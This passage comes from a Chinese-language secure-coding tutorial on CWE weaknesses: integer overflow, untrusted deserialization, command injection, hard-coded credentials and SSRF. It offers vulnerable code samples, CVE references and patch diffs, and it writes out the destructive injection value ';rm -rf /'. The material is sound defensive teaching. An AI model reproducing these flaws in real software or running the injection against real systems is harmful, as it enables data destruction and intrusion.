operator\\\"\u003e=\u003c/span\u003e \u003cspan class=\\\"token number\\\"\u003e0\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token keyword\\\"\u003echar\u003c/span\u003e buf\u003cspan class=\\\"token punctuation\\\"\u003e[\u003c/span\u003eSOMEBIGNUM\u003cspan class=\\\"token punctuation\\\"\u003e]\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\\n\u003cspan class=\\\"token keyword\\\"\u003ewhile\u003c/span\u003e \u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003ebytesRec \u003cspan class=\\\"token operator\\\"\u003e\u0026lt;\u003c/span\u003e MAXGET\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\\n    bytesRec \u003cspan class=\\\"token operator\\\"\u003e+=\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003egetFromInput\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003ebuf \u003cspan class=\\\"token operator\\\"\u003e+\u003c/span\u003e bytesRec\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ebytesRec\u003c/code\u003e定义为\u003ccode class=\\\"x-inline-highlight\\\"\u003eshort int\u003c/code\u003e类型，当\u003ccode class=\\\"x-inline-highlight\\\"\u003eMAXGET\u003c/code\u003e很大时，很可能导致\u003ccode class=\\\"x-inline-highlight\\\"\u003ebytesRec\u003c/code\u003e溢出（永远小于\u003ccode class=\\\"x-inline-highlight\\\"\u003eMAXGET\u003c/code\u003e），循环不会终止，并不断地覆盖\u003ccode class=\\\"x-inline-highlight\\\"\u003ebuf\u003c/code\u003e中的内容。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2018-20330\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2018-20330\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/libjpeg-turbo/libjpeg-turbo/issues/304\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/libjpeg-turbo/libjpeg-turbo/issues/304\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/libjpeg-turbo/libjpeg-turbo/commit/3d9c64e9f8aa1ee954d1d0bb3390fc894bb84da3\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"pitch = PAD((*width) * tjPixelSize[*pixelFormat], align);\\nif ((dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)\\nif ((unsigned long long)pitch * (unsigned long long)(*height) \u003e\\n    (unsigned long long)((size_t)-1) ||\\n    (dstBuf = (unsigned char *)malloc(pitch * (*height))) == NULL)\\n  _throwg(\\\"tjLoadImage(): Memory allocation failure\\\");\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 48px, var(--bg-transparent-red) 48px 72px, transparent 72px, transparent 72px, var(--bg-transparent-green) 72px 144px, transparent 144px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$35\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/502.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-502: Deserialization of Untrusted Data\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"反序列化不受信任的数据，也就是没有检查反序列化后的结果是否是有效的。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"try\\n{\\n    File file = new File(\\\"object.obj\\\");\\n    ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));\\n    javax.swing.JButton button = (javax.swing.JButton)in.readObject();\\n    in.close();\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$36\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果攻击者替换了文件内容，可能导致风险。\u003ccode class=\\\"x-inline-highlight\\\"\u003ereadObject()\u003c/code\u003e应当做如下改进：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"private final void readObject(ObjectInputStream in) throws java.io.IOException\\n{\\n    throw new java.io.IOException(\\\"Cannot be deserialized\\\");\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$37\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"class ExampleProtocol(protocol.Protocol):\\n    def dataReceived(self, data):\\n        # Code that would be here would parse the incoming data\\n        # After receiving headers, call confirmAuth() to authenticate\\n        pass\\n\\n    def confirmAuth(self, headers):\\n        try:\\n            token = cPickle.loads(base64.b64decode(headers['AuthToken']))\\n            if not check_hmac(token['signature'], token['data'], getSecretKey()):\\n                raise AuthFail\\n            self.secure_data = token['data']\\n        except:\\n            raise AuthFail\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$38\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这段代码没有验证传入数据是否合法。攻击者可以构造一个非法的序列化对象\u003ccode class=\\\"x-inline-highlight\\\"\u003eAuthToken\u003c/code\u003e，该对象通过实例化Python的子进程之一来执行任意命令。例如，攻击者可以构建一个利用Python子进程模块的\u003ccode class=\\\"x-inline-highlight\\\"\u003epickle\u003c/code\u003e，该模块会生成新进程并包含许多用于各种用途的参数。由于\u003ccode class=\\\"x-inline-highlight\\\"\u003ePickle\u003c/code\u003e库允许对象定义如何\u003ccode class=\\\"x-inline-highlight\\\"\u003eunpickle\u003c/code\u003e，因此攻击者可以指示\u003ccode class=\\\"x-inline-highlight\\\"\u003eunpickle\u003c/code\u003e进程在子进程模块中调用\u003ccode class=\\\"x-inline-highlight\\\"\u003ePopen\u003c/code\u003e并执行\u003ccode class=\\\"x-inline-highlight\\\"\u003e/bin/sh\u003c/code\u003e。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2020-13091\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2020-13091\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"如果\u003ccode class=\\\"x-inline-highlight\\\"\u003e__reduce__\u003c/code\u003e调用了\u003ccode class=\\\"x-inline-highlight\\\"\u003eos.system\u003c/code\u003e，1.0.3版本的Python Pandas库可以从传递给\u003ccode class=\\\"x-inline-highlight\\\"\u003eread_pickle()\u003c/code\u003e函数的不信任文件中反序列化，并执行命令。注意\u003ccode class=\\\"x-inline-highlight\\\"\u003eread_pickle()\u003c/code\u003e在\u003ca href=\\\"https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_pickle.html\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003e文档\u003c/a\u003e中已经被标记为不安全的，用户有责任确保传入的文件是可信的。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/77.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"命令注入，用户输入没有被中和，或错误地中和处理，导致执行的预期命令被修改。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"命令注入漏洞通常发生在以下情况：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"数据从不受信任的来源进入应用程序。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"数据是字符串的一部分，由应用程序作为命令执行。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"通过执行命令，应用程序为攻击者提供了其原本无法拥有的权限或能力。\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"int main(int argc, char **argv)\\n{\\n    char cmd[CMD_MAX] = \\\"/usr/bin/cat \\\";\\n    strcat(cmd, argv[1]);\\n    system(cmd);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$39\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上述程序出于对运维人员的教学目的将会以管理员权限执行。此时有命令注入的风险，例如传入\u003ccode class=\\\"x-inline-highlight\\\"\u003e\\\";rm -rf /\\\"\u003c/code\u003e。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"String btype = request.getParameter(\\\"backuptype\\\");\\nString cmd = new String(\\\"cmd.exe /K \\\\\\\" c:\\\\\\\\util\\\\\\\\rmanDB.bat \\\"\\n    +btype+\\n    \\\"\u0026\u0026c:\\\\\\\\utl\\\\\\\\cleanup.bat\\\\\\\"\\\"\\n)\\n\\nSystem.Runtime.getRuntime().exec(cmd);\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$3a\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"原因是类似的，\u003ccode class=\\\"x-inline-highlight\\\"\u003ebtype\u003c/code\u003e参数有被注入的风险。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2024-32027\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2024-32027\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/bmaltais/kohya_ss/commit/831af8babeb75faff62bcc6a8c6a4f80354f1ff1\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"此补丁移除了很多Python脚本中的\u003ccode class=\\\"x-inline-highlight\\\"\u003eshell=True\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"subprocess.run(run_cmd, shell=True, env=env)\\nsubprocess.run(run_cmd, env=env)\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-red) 24px 48px, transparent 48px, transparent 48px, var(--bg-transparent-green) 48px 72px, transparent 72px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"subprocess\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003erun\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003erun_cmd\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e shell\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003e\u003cspan class=\\\"token boolean\\\"\u003eTrue\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e env\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003eenv\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\nsubprocess\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003erun\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003erun_cmd\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e env\u003cspan class=\\\"token operator\\\"\u003e=\u003c/span\u003eenv\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"不加\u003ccode class=\\\"x-inline-highlight\\\"\u003eshell=True\u003c/code\u003e时，命令作为列表直接传递给操作系统，例如：\u003ccode class=\\\"x-inline-highlight\\\"\u003esubprocess.run(['ls', '-l'])\u003c/code\u003e； 这是更安全的。\u003cbr/\u003e使用\u003ccode class=\\\"x-inline-highlight\\\"\u003eshell=True\u003c/code\u003e时，命令通过解释器（例如\u003ccode class=\\\"x-inline-highlight\\\"\u003e/bin/sh\u003c/code\u003e或\u003ccode class=\\\"x-inline-highlight\\\"\u003ecmd.exe\u003c/code\u003e）运行，例如：\u003ccode class=\\\"x-inline-highlight\\\"\u003esubprocess.run('ls -l', shell=True)\u003c/code\u003e；这可能导致命令注入。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/119.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"缓冲区范围内的操作限制不当，产品对内存缓冲区执行操作，但它可以从缓冲区预期边界之外的内存位置读取或写入。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"包括前面提到的越界读取和越界写入。范围较为广泛，这里不详细展开了。\"}}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/798.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-798: Use of Hard-coded Credentials\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"使用硬编码的凭证，即凭证在源代码中直接出现。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"下面的代码硬编码了用户名和密码去连接数据库：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"...\\nDriverManager.getConnection(url, \\\"scott\\\", \\\"tiger\\\");\\n...\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\\n\u003cspan class=\\\"token class-name\\\"\u003eDriverManager\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token function\\\"\u003egetConnection\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003eurl\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"scott\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e,\u003c/span\u003e \u003cspan class=\\\"token string\\\"\u003e\\\"tiger\\\"\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e.\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"有权限访问到此源码的员工可以利用这点闯入系统。更坏的情况是如果攻击者能够访问到程序的字节码，可以使用\u003ccode class=\\\"x-inline-highlight\\\"\u003ejavap -c\u003c/code\u003e命令反汇编，得到明文密码，例如：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Plain Text\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"javap -c ConnMngr.class\\n22: ldc #36; //String jdbc:mysql://ixne.com/rxsql\\n24: ldc #38; //String scott\\n26: ldc #17; //String tiger\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"javap -c ConnMngr.class\\n22: ldc #36; //String jdbc:mysql://ixne.com/rxsql\\n24: ldc #38; //String scott\\n26: ldc #17; //String tiger\\n\"}}]}]]}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"硬编码加密后的密码同样是有问题的。理由同上，只要在源程序中明文出现，都会有很大的风险。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"int VerifyAdmin(char *password)\\n{\\n    if (strcmp(password, \\\"68af404b513073584c4b6f22b6c63e6b\\\"))\\n    {\\n        printf(\\\"Incorrect Password!\\\\n\\\");\\n        return (0);\\n    }\\n    printf(\\\"Entering Diagnostic Mode...\\\\n\\\");\\n    return (1);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$3b\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2020-35296\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2020-35296\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/Shrimant12/CVE-References/blob/main/CVE-2020-35296.md\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"管理员面板有默认账户\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin:admin\u003c/code\u003e。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/918.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-918: Server-Side Request Forgery (SSRF)\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"服务端请求伪造，攻击者通过伪造服务器发起的请求，使服务器端的应用程序访问受信任的第三方服务器或资源。通常，攻击者利用此漏洞访问内部系统。SSRF可以看作一种跳板攻击。\"}}],[\"$\",\"$L14\",null,{\"src\":\"ssrf.jpg\",\"width\":\"800px\",\"filterDarkTheme\":true}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2024-3149\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2024-3149\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" 